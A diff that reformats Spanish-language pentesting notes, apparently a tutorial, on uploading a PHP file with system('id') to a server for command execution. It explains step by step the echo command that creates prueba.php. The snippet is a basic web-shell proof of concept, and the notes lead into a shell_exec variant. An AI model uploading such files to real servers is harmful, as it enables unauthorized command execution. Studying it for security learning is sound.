@@ -176,62 +176,60 @@ Muchas páginas interpretan archivos PHP, por lo que podemos aprovecharlo para o
 
 ```php
 <?php
-	system('id');
+    system('id');
 ?>
 ```
-Para crear este archivo desde el editor nano por ejemplo o mediante echo y lo guardamos en un archivo que luego subimos:
 
-```
+Para crear este archivo desde el editor `nano`, por ejemplo, o mediante `echo` y guardarlo en un archivo que luego subimos:
+
+```bash
 echo "<?php\nsystem('id');\n?>" > prueba.php
-
 ```
+
 ---
-	🔍 Parte por parte
-	
- 	
-  	-1️⃣ echo
-  
-		echo imprime texto en la terminal.
 
-	
- 	-2️⃣ El texto:
-	
- 		```bash
- 		"<?php\nsystem('id');\n?>"
-		```
- 	
-  		Es un string (texto) que contiene el código que queremos poner en el archivo.
+### 🔍 Parte por parte
 
-		Ahora, veamos los \n:
+#### 1️⃣ `echo`
 
-			\n es un salto de línea (newline).
-	
-			Esto hace que el código quede con el formato adecuado (cada línea en su lugar), en vez de todo en una sola línea.
-   	
-    	Así que este texto:
-    	
-     	```bash
-	  "<?php\nsystem('id');\n?>"
-	```
- 	
-  	cuando se imprime realmente se ve así:
+`echo` imprime texto en la terminal.
 
-	```bash
- 	<?php
-	system('id');
-	?>
-	```
- 	
-  	
-   	-3️⃣ > prueba.php
-	
- 		> redirige la salida del comando (el texto que echo imprime) a un archivo.
+#### 2️⃣ El texto
 
-		En este caso, lo guarda en un archivo llamado prueba.php.
+```bash
+"<?php\nsystem('id');\n?>"
+```
 
-		Si el archivo ya existe, lo sobrescribe.
- 
+Es un *string* (texto) que contiene el código que queremos poner en el archivo.
+
+Ahora, veamos los `\n`:
+
+- `\n` es un salto de línea (*newline*).
+- Esto hace que el código quede con el formato adecuado (cada línea en su lugar), en vez de todo en una sola línea.
+
+Así que este texto:
+
+```bash
+"<?php\nsystem('id');\n?>"
+```
+
+Cuando se imprime, realmente se ve así:
+
+```php
+<?php
+system('id');
+?>
+```
+
+#### 3️⃣ `> prueba.php`
+
+`>` redirige la salida del comando (el texto que `echo` imprime) a un archivo.
+
+- En este caso, lo guarda en un archivo llamado `prueba.php`.
+- Si el archivo ya existe, lo sobrescribe.
+
 ---
+
 
 ### 🔸 Ejemplo más flexible con `shell_exec`
 
